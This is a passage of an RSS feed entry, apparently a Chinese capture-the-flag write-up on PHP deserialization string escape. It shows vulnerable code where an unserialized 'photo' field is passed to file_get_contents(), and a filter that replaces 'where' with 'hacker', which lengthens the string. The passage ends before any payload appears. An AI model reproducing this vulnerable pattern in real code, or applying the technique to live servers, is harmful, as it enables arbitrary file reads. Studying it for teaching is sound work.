style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($profile);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$photo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;$profile&lt;/code&gt; 是从数据库读取的序列化字符串，经过 &lt;code&gt;unserialize()&lt;/code&gt; 后得到数组。&lt;code&gt;$profile[&#39;photo&#39;]&lt;/code&gt; 作为文件路径传入 &lt;code&gt;file_get_contents()&lt;/code&gt;，结果被 base64 编码输出到页面。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;如果能控制 &lt;code&gt;$profile[&#39;photo&#39;]&lt;/code&gt; 的值，就能读取服务器上的任意文件。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;2-反序列化字符串逃逸&#34;&gt;2. 反序列化字符串逃逸&lt;/h3&gt;&#xA;&lt;h4 id=&#34;21-filter-函数&#34;&gt;2.1 filter() 函数&lt;/h4&gt;&#xA;&lt;p&gt;&lt;code&gt;class.php&lt;/code&gt; 中的 &lt;code&gt;filter()&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filter&lt;/span&gt;($string) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $escape &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $escape &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;implode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;($escape, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $safe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $safe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;implode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;($safe, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;</description>
+			</item>
+	</channel>
+</rss>
